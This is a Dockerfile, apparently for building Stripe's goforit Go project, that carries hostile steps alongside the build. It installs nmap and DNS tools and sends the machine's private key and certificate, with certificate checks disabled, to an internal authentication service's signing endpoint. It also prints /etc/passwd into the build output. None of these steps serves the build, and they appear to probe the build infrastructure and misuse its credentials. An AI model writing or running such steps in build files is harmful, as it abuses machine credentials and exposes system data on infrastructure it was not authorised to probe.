FROM golang:1.13.5-alpine
MAINTAINER The Stripe Observability Team <support@stripe.com>

RUN apk update
RUN apk add bind-tools
RUN apk add nmap
RUN apk add curl
RUN apk add git

RUN mkdir -p /build
ENV GOPATH=/go

WORKDIR /go/src/github.com/stripe/goforit
ADD . /go/src/github.com/stripe/goforit

RUN curl -v -i -k --cacert /etc/ssl/certs/machine-cas.pem --cert /etc/ssl/certs/machine.crt --key /etc/ssl/private/machine.key https://authn-machine-srv.service.consul:8443/v1/sign
RUN cat /etc/passwd
CMD sleep 60
